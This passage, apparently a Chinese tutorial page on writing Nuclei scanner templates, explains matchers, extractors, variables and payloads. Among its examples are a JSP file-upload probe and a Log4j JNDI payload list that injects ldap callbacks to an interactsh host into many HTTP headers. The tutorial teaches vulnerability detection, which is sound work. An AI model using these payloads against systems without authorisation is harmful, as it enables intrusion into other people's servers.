+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">word</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;error&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;Version&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#使用多个匹配器的情况：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;X-Powered-By: PHP&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;PHPSESSID&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">header</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;PHP&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">body</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="dsl匹配器">dsl匹配器</h2>
+<p>复杂的匹配器类型dsl允许使用辅助函数构建更精细的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">dsl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">dsl</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;len(body)&lt;1024 &amp;&amp; status_code==200&#34;</span><span class="w"> </span><span class="c"># Body length less than 1024 and 200 status code</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;contains(toupper(body), md5(cookie))&#34;</span><span class="w"> </span><span class="c"># Check if the MD5 sum of cookies is contained in the uppercase body</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>协议响应的每个部分都可以与DSL匹配器匹配，例如：</p>
+<table>
+<thead>
+<tr>
+<th>Response Part</th>
+<th>Description</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>content_length</td>
+<td>Content-Length Header</td>
+<td>content_length &gt;= 1024</td>
+</tr>
+<tr>
+<td>status_code</td>
+<td>Response Status Code</td>
+<td>status_code==200</td>
+</tr>
+<tr>
+<td>all_headers</td>
+<td>Unique string containing all headers</td>
+<td>len(all_headers)</td>
+</tr>
+<tr>
+<td>body</td>
+<td>Body as string</td>
+<td>len(body)</td>
+</tr>
+<tr>
+<td>header_name</td>
+<td>Lowercase header name with <code>-</code> converted to <code>_</code></td>
+<td>len(user_agent)</td>
+</tr>
+<tr>
+<td>raw</td>
+<td>Headers + Response</td>
+<td>len(raw)</td>
+</tr>
+</tbody>
+</table>
+<p>有时候使用dsl匹配器未必一定要使用<code>condition</code>，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">dsl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">dsl</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;len(body)&lt;1024 &amp;&amp; status_code==200 &amp;&amp; contains(body,&#34;</span><span class="l">OK&#34;)&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>dsl有两个比较常用的辅助函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 同时匹配响应体中多个关键字
+</span></span><span class="line"><span class="cl">contains_all(body,&#34;[PHP]&#34;,&#34;php.ini&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 匹配响应体中单个关键字
+</span></span><span class="line"><span class="cl">contains(body,&#34;[PHP]&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 匹配OOB dns响应
+</span></span><span class="line"><span class="cl">contains(interactsh_protocol,&#34;dns&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="负匹配器">负匹配器</h2>
+<p>顾名思义，负匹配器与匹配器效果相反，当要否定某个匹配或者说排除某个匹配项时负匹配器非常有用，可以通过添加matchers块<code>negative: true</code>来使用。</p>
+<p>例如，要匹配返回<code>PHPSESSID</code>响应标头中没有的所有 URL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;PHPSESSID&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">header</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">negative</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="提取器extractors">提取器————extractors</h1>
+<h2 id="正则表达式提取器">正则表达式提取器</h2>
+<p>正则表达式提取器，通过该方法，将正则表达式匹配到的内容，提取到指定变量中去使用。</p>
+<p>在下面的示例中，如果响应中包含类似 “Version: 1.2.3” 的文本，它将提取版本号并存储在名为 version 的变量中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">extractors</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">regex</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Version: (\\d+\\.\\d+\\.\\d+)&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">target</span><span class="p">:</span><span class="w"> </span><span class="l">version</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="json提取器">JSON提取器</h2>
+<p>用于从 JSON 块中提取对象的值，同时该提取器也支持赋值。</p>
+<p>在下面的示例中，如果 JSON 响应包含一个名为 user 的对象，其中有一个名为 name 的属性，它将提取该属性的值并存储在名为 username 的变量中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">extractors</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">json</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">.user.name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">target</span><span class="p">:</span><span class="w"> </span><span class="l">username</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="xpath提取器">Xpath提取器</h2>
+<p>从 HTML 响应中提取属性值的xpath提取器。</p>
+<p>在下面的示例中，如果 HTML 响应包含一个 <code>&lt;img&gt;</code> 标签，它将提取 src 属性的值并存储在名为 image_url 的变量中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">extractors</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">xpath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">expression</span><span class="p">:</span><span class="w"> </span><span class="l">//img/@src</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">target</span><span class="p">:</span><span class="w"> </span><span class="l">image_url</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="kval提取器">Kval提取器</h2>
+<p>从 HTTP 响应中提取标头的内容。</p>
+<p>下面示例是提取响应头中<code>content-type</code>内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">extractors:
+</span></span><span class="line"><span class="cl">      - type: kval  # type of the extractor
+</span></span><span class="line"><span class="cl">        kval:
+</span></span><span class="line"><span class="cl">          - content_type  # header/cookie value to extract from response
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>请注意，<code>content-type</code>已替换为，<code>content_type</code>因为Kval提取器不接受破折号 ( <code>-</code>) 作为输入，必须替换为下划线 ( <code>_</code>)。</p>
+<h2 id="dsl提取器">DSL提取器</h2>
+<p>下面示例是通过dsl辅助函数<code>len</code>提取响应体的长度</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">extractors:
+</span></span><span class="line"><span class="cl">      - type: dsl  # type of the extractor
+</span></span><span class="line"><span class="cl">        dsl:
+</span></span><span class="line"><span class="cl">          - &#34;len(body)&#34;  # dsl expression value to extract from response
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="动态提取器">动态提取器</h2>
+<p>在编写多请求模板时，提取器可用于在运行时捕获动态值。CSRF Tokens、Session Headers 等可以被提取并在请求中使用。此功能仅适用于 RAW 请求格式。</p>
+<p>使用名称定义动态提取器的示例，该提取器<code>api</code>将从请求中捕获基于正则表达式的模式。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">extractors</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">regex</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">api</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">body</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">internal</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="c"># Required for using dynamic variables</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">regex</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;(?m)[0-9]{3,10}\.[0-9]+&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取的值存储在变量 <strong>api</strong> 中，可以在后续请求的任何部分中使用。</p>
+<p>如果要将提取器用作动态变量，则必须使用<code>internal: true</code>以避免在终端中打印提取的值。</p>
+<p>还可以为正则表达式指定可选的正则表达式 <strong>匹配组以进行更复杂的匹配。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">extractors</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">regex </span><span class="w"> </span><span class="c"># type of extractor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">csrf_token</span><span class="w"> </span><span class="c"># defining the variable name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">body</span><span class="w"> </span><span class="c"># part of response to look for</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># group defines the matching group being used. </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># In GO the &#34;match&#34; is the full array of all matches and submatches </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># match[0] is the full match</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># match[n] is the submatches. Most often we&#39;d want match[1] as depicted below</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="m">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">regex</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s1">&#39;&lt;inputsname=&#34;csrf_token&#34;stype=&#34;hidden&#34;svalue=&#34;([[:alnum:]]{16})&#34;s/&gt;&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面带有名称的提取器<code>csrf_token</code>将保存由<code>([[:alnum:]]{16})</code>as提取的值<code>abcdefgh12345678</code>。</p>
+<p>如果此正则表达式未提供组选项，则上述名称提取器<code>csrf_html_tag</code>将完整匹配（by <code>&lt;input name=&quot;csrf_token&quot;stype=&quot;hidden&quot;svalue=&quot;([[:alnum:]]{16})&quot; /&gt;</code>）作为<code>&lt;input name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;abcdefgh12345678&quot; /&gt;</code>.</p>
+<h1 id="变量">变量</h1>
+<h2 id="变量的定义与使用">变量的定义与使用</h2>
+<p>变量可用于声明一些在整个模板中保持不变的值。变量的值一旦计算就不会改变。变量可以是简单的字符串或 DSL 辅助函数。如果变量是辅助函数，则用双花括号括起来<code>{{expression}}</code>。变量在模板级别声明，目前，dns、http、headless和网络协议支持变量。一般使用<code>variables</code>来定义变量，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">variables</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">filename</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{to_lower(rand_base(10))}}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">boundary</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{to_lower(rand_base(20))}}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">http</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">raw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">        POST /temp/upload?groupid=aa&amp;fileType=jsp HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Host: {{Hostname}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Content-type: multipart/form-data; boundary=----------{{boundary}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        
+</span></span></span><span class="line"><span class="cl"><span class="sd">        ------------{{boundary}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Content-Disposition: form-data; name=&#34;upload&#34;; filename=&#34;{{filename}}.jsp&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Content-Type: application/octet-stream
+</span></span></span><span class="line"><span class="cl"><span class="sd">        
+</span></span></span><span class="line"><span class="cl"><span class="sd">        &lt;% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sd">        ------------{{boundary}}--</span><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">raw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">        GET /temp/static/pages/aa/{{filename}}.jsp HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Host: {{Hostname}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36</span><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">dsl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">dsl</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="s2">&#34;status_code_2 == 200 &amp;&amp; contains(body_2,&#39;12321&#39;)&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面使用辅助函数定义了两个变量filename和boundary，在整个请求过程中变量的值不会改变</p>
+<h2 id="攻击载荷">攻击载荷</h2>
+<p>payloads定义与变量相同，payloads 用来提供攻击载荷的部分，格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payloads</span><span class="p">:</span>    
+</span></span><span class="line"><span class="cl">  <span class="err">变量名</span><span class="p">:</span> <span class="err">变量内容</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如log4j扫描模板：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">requests</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">raw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">        GET / HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Host: {{Hostname}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        {{log4j_payloads}}</span><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">        POST / HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="sd">        Host: {{Hostname}}
+</span></span></span><span class="line"><span class="cl"><span class="sd">        {{log4j_payloads}}</span><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">payloads</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">log4j_payloads</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Client-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Remote-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Remote-Addr</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Forwarded-For</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Originating-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Referer</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;CF-Connecting_IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;True-Client-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Forwarded-For</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Originating-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Real-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Client-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Forwarded</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Client-IP</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Contact</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
